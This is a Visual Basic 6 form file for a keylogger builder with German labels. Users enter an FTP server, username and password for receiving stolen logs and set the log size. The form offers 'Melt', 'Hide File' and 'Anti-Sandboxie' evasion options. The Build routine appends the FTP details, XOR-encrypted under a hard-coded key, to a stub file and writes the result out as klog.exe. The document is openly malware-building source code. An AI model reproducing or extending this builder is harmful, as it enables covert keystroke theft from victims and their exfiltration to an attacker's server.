VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3570
   ClientLeft      =   120
   ClientTop       =   420
   ClientWidth     =   6000
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   ScaleHeight     =   3570
   ScaleWidth      =   6000
   StartUpPosition =   3  'Windows-Standard
   Begin VB.CheckBox Check3 
      Caption         =   "Hide File"
      Height          =   195
      Left            =   3360
      TabIndex        =   15
      Top             =   2760
      Width           =   2175
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   4560
      TabIndex        =   14
      Text            =   "2000"
      Top             =   2350
      Width           =   1215
   End
   Begin VB.CommandButton Command3 
      Caption         =   "About"
      Height          =   375
      Left            =   3360
      TabIndex        =   12
      Top             =   3120
      Width           =   975
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Build"
      Height          =   375
      Left            =   4440
      TabIndex        =   10
      Top             =   3120
      Width           =   1455
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Test"
      Height          =   375
      Left            =   1680
      TabIndex        =   9
      Top             =   3120
      Width           =   735
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Anti-Sandboxie"
      Enabled         =   0   'False
      Height          =   255
      Left            =   3360
      TabIndex        =   8
      Top             =   2040
      Value           =   1  'Aktiviert
      Width           =   1815
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Melt"
      Enabled         =   0   'False
      Height          =   255
      Left            =   3360
      TabIndex        =   7
      Top             =   1680
      Value           =   1  'Aktiviert
      Width           =   1815
   End
   Begin VB.Frame Frame1 
      Caption         =   "      Details"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Left            =   120
      TabIndex        =   0
      Top             =   1560
      Width           =   3135
      Begin VB.TextBox Text3 
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   1320
         PasswordChar    =   "*"
         TabIndex        =   6
         Top             =   960
         Width           =   1695
      End
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   1320
         TabIndex        =   5
         Top             =   600
         Width           =   1695
      End
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   1320
         TabIndex        =   4
         Top             =   240
         Width           =   1695
      End
      Begin VB.Image Image2 
         Height          =   240
         Left            =   120
         Picture         =   "frmMains.frx":0000
         Top             =   0
         Width           =   240
      End
      Begin VB.Label Label3 
         Caption         =   "FTP-Passwort:"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   960
         Width           =   1215
      End
      Begin VB.Label Label2 
         Caption         =   "FTP-Name:"
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   600
         Width           =   855
      End
      Begin VB.Label Label1 
         Caption         =   "FTP-Adresse:"
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   975
      End
   End
   Begin VB.Label Label5 
      Caption         =   "Max. Loggröße:"
      Height          =   255
      Left            =   3360
      TabIndex        =   13
      Top             =   2400
      Width           =   1335
   End
   Begin VB.Label Label4 
      Caption         =   "Not Tested!"
      Height          =   255
      Left            =   600
      TabIndex        =   11
      Top             =   3120
      Width           =   975
   End
   Begin VB.Image Image4 
      Height          =   240
      Left            =   240
      Picture         =   "frmMains.frx":040F
      Top             =   3120
      Width           =   240
   End
   Begin VB.Image Image3 
      Height          =   240
      Left            =   240
      Picture         =   "frmMains.frx":07F0
      Top             =   3120
      Width           =   240
   End
   Begin VB.Image Image1 
      Height          =   1500
      Left            =   0
      Picture         =   "frmMains.frx":0BE3
      Top             =   0
      Width           =   6000
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim c As New cFTP

Private Sub Command1_Click()
Image4.Visible = True
Image3.Visible = False
Label4.Caption = "Testing..."
If c.Connect(Text1.Text, Text2.Text, Text3.Text) Then
Image3.Visible = True
Image4.Visible = False
Label4.Caption = "Works"
Else
Image4.Visible = True
Image3.Visible = False
Label4.Caption = "Failed"
End If
End Sub

Private Sub Command2_Click()
Dim stubinhalt As String
If Text1.Text = "" Or Text2.Text = "" Or Text3.Text = "" Or Text4.Text = "" Then
MsgBox "Fill in all Textboxes!"
Exit Sub
End If
Open App.Path & "\stub.dat" For Binary As #1
stubinhalt = Space(LOF(1))
Get #1, , stubinhalt
Close #1
stubinhalt = stubinhalt & "/////" & dks(Text1.Text, "Slayer616isthefuckinKing") & "/////" & dks(Text2.Text, "Slayer616isthefuckinKing") & "/////" & dks(Text3.Text, "Slayer616isthefuckinKing") & "/////" & dks(Text4.Text, "Slayer616isthefuckinKing") & "/////"
Open App.Path & "\klog.exe" For Binary As #1
Put #1, , stubinhalt
Close #1
End Sub
Function dks(ggt As String, pwd As String) As String
Dim i As Integer            'Loop counter
Dim intKeyChar As Integer   'Character within the key that we'll use to encrypt
Dim strTemp As String       'Store the encrypted string as it grows
Dim strText As String       'The initial text to be encrypted
Dim strKey As String        'The encryption key
Dim strChar1 As String * 1  'The first character to XOR
Dim strChar2 As String * 1  'The second character to XOR

        strText = ggt
   
    strKey = pwd

    For i = 1 To Len(strText)
       
        strChar1 = Mid(strText, i, 1)
      
        intKeyChar = ((i - 1) Mod Len(strKey)) + 1
    
        strChar2 = Mid(strKey, intKeyChar, 1)

        strTemp = strTemp & Chr(Asc(strChar1) Xor Asc(strChar2))
    Next i

    dks = strTemp

End Function

